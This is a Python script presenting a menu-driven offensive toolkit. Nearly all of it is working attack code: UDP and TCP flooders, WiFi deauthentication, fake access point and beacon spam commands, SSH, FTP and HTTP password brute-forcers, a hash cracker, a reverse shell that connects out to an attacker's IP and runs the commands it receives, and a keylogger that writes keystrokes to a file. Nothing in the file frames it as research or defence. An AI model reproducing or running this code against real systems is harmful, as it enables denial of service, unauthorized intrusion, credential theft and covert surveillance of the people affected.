import os, sys, time, random, socket, threading, hashlib, smtplib, getpass

def udp_flood():
    ip = input("IP: ")
    port = int(input("Port: "))
    dur = int(input("Duration: "))
    timeout = time.time() + dur
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    while time.time() < timeout:
        sock.sendto(payload, (ip, port))

def tcp_flood():
    ip = input("IP: ")
    port = int(input("Port: "))
    dur = int(input("Duration: "))
    timeout = time.time() + dur
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(random._urandom(4096))
            sock.close()
        except: pass

def port_scan():
    ip = input("IP: ")
    for p in range(1,1025):
        s = socket.socket()
        s.settimeout(0.5)
        if s.connect_ex((ip,p)) == 0:
            print(f"Port {p}: OPEN")
        s.close()

def packet_sniffer():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
    while True:
        raw,addr = s.recvfrom(65565)
        print(raw)

def wifi_scan():
    os.system("nmcli dev wifi list")

def wifi_deauth():
    iface = input("Interface: ")
    bssid = input("Target BSSID: ")
    os.system(f"aireplay-ng --deauth 100 -a {bssid} {iface}")

def fake_ap():
    ssid = input("Fake SSID: ")
    iface = input("Interface: ")
    os.system(f"airbase-ng -e \"{ssid}\" {iface}")

def beacon_spam():
    iface = input("Interface: ")
    os.system(f"mdk4 {iface} b -s 1000")

def ssh_brute():
    import paramiko
    ip = input("IP: ")
    user = input("Username: ")
    wl = input("Wordlist path: ")
    with open(wl, 'r') as f:
        for line in f:
            pwd = line.strip()
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, username=user, password=pwd, timeout=3)
                print(f"Success: {pwd}")
                ssh.close()
                return
            except: pass
    print("Done.")

def ftp_brute():
    from ftplib import FTP
    ip = input("IP: ")
    user = input("Username: ")
    wl = input("Wordlist path: ")
    with open(wl, 'r') as f:
        for line in f:
            pwd = line.strip()
            try:
                ftp = FTP(ip)
                ftp.login(user, pwd)
                print(f"Success: {pwd}")
                ftp.quit()
                return
            except: pass
    print("Done.")

def http_brute():
    import requests
    url = input("Login URL: ")
    user = input("Username param name: ")
    passw = input("Password param name: ")
    fixed_user = input("Username value: ")
    wl = input("Wordlist path: ")
    with open(wl, 'r') as f:
        for line in f:
            pwd = line.strip()
            data = {user:fixed_user,passw:pwd}
            r = requests.post(url,data=data)
            if "invalid" not in r.text.lower():
                print(f"Success: {pwd}")
                return
    print("Done.")

def wordlist_gen():
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    size = int(input("Password length: "))
    count = int(input("How many: "))
    with open("wordlist.txt","w") as f:
        for _ in range(count):
            pw = "".join(random.choice(chars) for _ in range(size))
            f.write(pw + "\n")
    print("Saved wordlist.txt")

def password_gen():
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    length = int(input("Length: "))
    pw = "".join(random.choice(chars) for _ in range(length))
    print(f"Password: {pw}")

def hash_crack():
    hash_input = input("Hash: ")
    wl = input("Wordlist: ")
    algo = input("md5/sha1/sha256: ")
    with open(wl,'r') as f:
        for line in f:
            word = line.strip()
            if algo=="md5":
                if hashlib.md5(word.encode()).hexdigest() == hash_input:
                    print(f"Found: {word}")
                    return
            if algo=="sha1":
                if hashlib.sha1(word.encode()).hexdigest() == hash_input:
                    print(f"Found: {word}")
                    return
            if algo=="sha256":
                if hashlib.sha256(word.encode()).hexdigest() == hash_input:
                    print(f"Found: {word}")
                    return
    print("Done.")

def email_sender():
    server = input("SMTP server: ")
    port = int(input("Port: "))
    sender = input("Your email: ")
    password = getpass.getpass("Password: ")
    rec = input("Recipient email: ")
    subject = input("Subject: ")
    body = input("Body: ")
    smtp = smtplib.SMTP(server, port)
    smtp.starttls()
    smtp.login(sender, password)
    msg = f"Subject: {subject}\n\n{body}"
    smtp.sendmail(sender, rec, msg)
    smtp.quit()
    print("Email sent.")

def reverse_shell():
    ip = input("Your IP: ")
    port = int(input("Your Port: "))
    s = socket.socket()
    s.connect((ip, port))
    while True:
        cmd = s.recv(1024).decode()
        if cmd.lower() == "exit": break
        output = os.popen(cmd).read()
        s.send(output.encode())
    s.close()

def keylogger():
    from pynput import keyboard
    keys = []
    def on_press(key):
        try: keys.append(key.char)
        except: keys.append(str(key))
        if len(keys) > 5:
            with open("keys.txt","a") as f:
                f.write("".join(keys))
            keys.clear()
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    input("Keylogger running... Press Enter to stop.\n")
    listener.stop()

def menu():
    while True:
        os.system('cls' if os.name=='nt' else 'clear')
        print("[1] Networking Tools")
        print("[2] WiFi Tools")
        print("[3] Brute Force Tools")
        print("[4] Utility Tools")
        print("[0] Exit")
        c = input("\nSelect > ")
        if c == "1": networking_menu()
        if c == "2": wifi_menu()
        if c == "3": brute_menu()
        if c == "4": utility_menu()
        if c == "0": sys.exit()

def networking_menu():
    while True:
        os.system('cls' if os.name=='nt' else 'clear')
        print("[1] UDP Flood")
        print("[2] TCP Flood")
        print("[3] Port Scan")
        print("[4] Packet Sniffer")
        print("[0] Back")
        c = input("\nSelect > ")
        if c=="1": udp_flood()
        if c=="2": tcp_flood()
        if c=="3": port_scan()
        if c=="4": packet_sniffer()
        if c=="0": break
        input("\nPress Enter...")

def wifi_menu():
    while True:
        os.system('cls' if os.name=='nt' else 'clear')
        print("[1] WiFi Scan")
        print("[2] Deauth Attack")
        print("[3] Fake AP")
        print("[4] Beacon Spam")
        print("[0] Back")
        c = input("\nSelect > ")
        if c=="1": wifi_scan()
        if c=="2": wifi_deauth()
        if c=="3": fake_ap()
        if c=="4": beacon_spam()
        if c=="0": break
        input("\nPress Enter...")

def brute_menu():
    while True:
        os.system('cls' if os.name=='nt' else 'clear')
        print("[1] SSH Brute")
        print("[2] FTP Brute")
        print("[3] HTTP Brute")
        print("[4] Wordlist Generator")
        print("[0] Back")
        c = input("\nSelect > ")
        if c=="1": ssh_brute()
        if c=="2": ftp_brute()
        if c=="3": http_brute()
        if c=="4": wordlist_gen()
        if c=="0": break
        input("\nPress Enter...")

def utility_menu():
    while True:
        os.system('cls' if os.name=='nt' else 'clear')
        print("[1] Password Generator")
        print("[2] Hash Cracker")
        print("[3] Email Sender")
        print("[4] Reverse Shell Client")
        print("[5] Keylogger")
        print("[0] Back")
        c = input("\nSelect > ")
        if c=="1": password_gen()
        if c=="2": hash_crack()
        if c=="3": email_sender()
        if c=="4": reverse_shell()
        if c=="5": keylogger()
        if c=="0": break
        input("\nPress Enter...")

if __name__ == "__main__":
    menu()
